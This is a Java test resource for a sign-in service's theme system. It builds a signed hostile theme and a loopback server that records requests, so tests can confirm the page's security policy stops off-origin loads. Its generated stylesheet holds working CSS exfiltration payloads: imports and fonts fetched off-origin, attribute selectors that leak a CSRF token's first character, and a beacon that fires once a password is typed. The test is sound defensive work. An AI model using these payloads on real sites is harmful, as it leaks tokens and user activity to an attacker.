// SPDX-License-Identifier: Apache-2.0
package dev.tessera.iam.adapter.rest.support;

import com.nimbusds.jose.jwk.ECKey;
import com.sun.net.httpserver.HttpServer;
import io.quarkus.test.common.QuarkusTestResourceLifecycleManager;
import java.io.IOException;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.Map;
import java.util.concurrent.CopyOnWriteArrayList;

/**
 * A signed theme that attacks the page it styles, and an off-origin server that records what
 * reaches it. The theme passes tessera's boot checks on purpose: this is what the page's policy
 * has to stop, should such a theme ever get through CI.
 */
public class HostileThemeResource implements QuarkusTestResourceLifecycleManager {

    /** Each attack, by the path it requests from the off-origin server. */
    public static final List<String> ATTACKS =
            List.of("/import", "/font", "/background", "/csrf-prefix", "/password-typed");

    private static final String BASE64URL = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
    private static final List<String> REQUESTS = new CopyOnWriteArrayList<>();

    private HttpServer sink;

    /** The paths the off-origin server has received since the last {@link #clearRequests()}. */
    public static List<String> requests() {
        return List.copyOf(REQUESTS);
    }

    public static void clearRequests() {
        REQUESTS.clear();
    }

    @Override
    public Map<String, String> start() {
        try {
            sink = HttpServer.create(new InetSocketAddress(InetAddress.getLoopbackAddress(), 0), 0);
            sink.createContext("/", exchange -> {
                REQUESTS.add(exchange.getRequestURI().getPath());
                exchange.sendResponseHeaders(204, -1);
                exchange.close();
            });
            sink.start();
            String origin = "http://127.0.0.1:" + sink.getAddress().getPort();

            ECKey key = SignedThemes.newKey();
            Path root = Files.createTempDirectory("tessera-hostile-theme");
            SignedThemes.write(root, key, "hostile", Map.of(
                    "theme.css", stylesheet(origin).getBytes(StandardCharsets.UTF_8),
                    "mark.png", new byte[] {(byte) 0x89, 'P', 'N', 'G'},
                    "fonts/own.woff2", new byte[] {'w', 'O', 'F', '2'}));
            return Map.of(
                    "iam.signin.themes.directory", root.toString(),
                    "iam.signin.themes.public-key", key.toPublicJWK().toJSONString());
        } catch (IOException e) {
            throw new IllegalStateException(e);
        }
    }

    private static String stylesheet(String origin) {
        StringBuilder css = new StringBuilder();
        css.append("@import url(").append(origin).append("/import);\n");
        css.append("@font-face { font-family: stolen; src: url(").append(origin).append("/font); }\n");
        css.append("@font-face { font-family: own; src: url(fonts/own.woff2); }\n");
        css.append("body { font-family: stolen; background-image: url(").append(origin).append("/background); }\n");
        css.append("h1 { font-family: own; }\n");
        css.append("main { background-image: url(mark.png); }\n");
        for (char c : BASE64URL.toCharArray()) {
            css.append("input[name=csrf][value^=\"").append(c).append("\"] ~ button { background-image: url(")
                    .append(origin).append("/csrf-prefix); }\n");
        }
        css.append("input[type=password]:valid { background-image: url(").append(origin).append("/password-typed); }\n");
        return css.toString();
    }

    @Override
    public void stop() {
        if (sink != null) {
            sink.stop(0);
        }
    }
}
